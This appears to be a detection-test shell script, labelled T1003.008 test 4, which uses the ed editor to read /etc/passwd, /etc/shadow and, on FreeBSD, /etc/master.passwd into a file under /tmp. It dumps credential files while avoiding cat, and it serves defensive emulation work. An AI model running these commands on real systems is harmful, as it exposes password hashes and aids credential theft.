#!/bin/sh
# T1003.008 test 4: Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat
# elevation_required: True
unamestr=$(uname)
if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; fi
